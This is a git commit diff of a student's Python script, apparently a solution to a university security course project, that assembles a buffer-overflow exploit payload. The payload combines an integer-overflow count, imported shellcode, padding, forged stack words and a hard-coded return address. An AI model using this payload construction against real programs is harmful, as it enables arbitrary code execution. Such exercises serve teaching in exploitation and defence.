e0af5d35d7cd44ff4e1c0bf73a433e74d5abe208
hirochri <hirochri@umich.edu>
2017-03-24 16:23:27 -0400

    We ignore a big chunk of code lol

--- project4/sol4.py
+++ project4/sol4.py
@@ -3,13 +3,33 @@
 from struct import pack
 from shellcode import shellcode
 
+
 count = 1073741838
+count_packed = pack("<I", count)
+fullbuffer = shellcode + "B"*3
+
+other_mem = ""
+
+other_mem += pack("<I", 0xbffefa98)
+other_mem += pack("<I", 0x0804890b)
+
+other_mem += pack("<I", 0xbffefa84)
+other_mem += pack("<I", 0x00000004)
+other_mem += pack("<I", 0x00000001)
+other_mem += pack("<I", 0x080efa00)
+
+other_mem += pack("<I", 0x00000000)
+other_mem += pack("<I", 0x4000000e)
+other_mem += pack("<I", 0xbffefa30)
+other_mem += pack("<I", 0x080efa00)
+
+other_mem += pack("<I", 0x00000000)
+other_mem += pack("<I", 0x00000000)
+
+end = "C"*4 + pack("<I", 0xbffefa30)
+
+
+
 f = open("tmp", "wb")
-#buf_ret_addr = pack("<I", 0
-#f.write(pack("<I", count) + "A"*53 + "B"*7)
-#f.write(pack("<I", count) + shellcode + "B"*7 + "B"*44 + pack("<I", 0xbffefa30))
-#lets just fill buffer for now
-addr = pack("<I", 0xbffefa30)
-f.write(pack("<I", count) + "A"*53 + "B"*3 + "C"*4 + addr)
-#f.write(out)
+f.write(count_packed + fullbuffer + other_mem + end)
 f.close()
